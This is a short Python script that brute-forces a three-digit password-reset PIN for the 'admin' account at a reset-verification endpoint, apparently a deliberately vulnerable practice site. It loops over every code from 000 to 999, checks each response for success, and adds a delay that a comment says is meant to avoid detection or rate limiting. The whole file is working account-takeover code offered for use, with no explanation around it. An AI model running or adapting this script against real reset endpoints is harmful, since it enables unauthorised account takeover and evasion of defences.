import requests
import time

# Target endpoint where you submit the PIN
URL = "https://vulnbank.org/api/reset/verify"
# The username or ID being targeted
USERNAME = "admin"
# Optional headers if needed (adjust based on Burp capture)
HEADERS = {
    "Content-Type": "application/json",
    "Origin": "https://vulnbank.org"
}
def brute_force_pin():
    for pin in range(1000):  # 000 to 999
        code = str(pin).zfill(3)  # Pads with leading zeros, e.g., 007, 042
        payload = {
            "username": USERNAME,
            "reset_code": code
        }
        # Send request
        response = requests.post(URL, json=payload, headers=HEADERS)

        # Check for success condition (adjust depending on API response)
        if "success" in response.text.lower() and "incorrect" not in response.text.lower():
            print(f"[+] Found PIN: {code}")
            print(f"Server Response: {response.text}")
            break
        else:
            print(f"[-] Tried {code}")

        # polite delay to avoid detection/rate limit (tweak as needed)
        time.sleep(0.2)
if __name__ == "__main__":
    brute_force_pin()

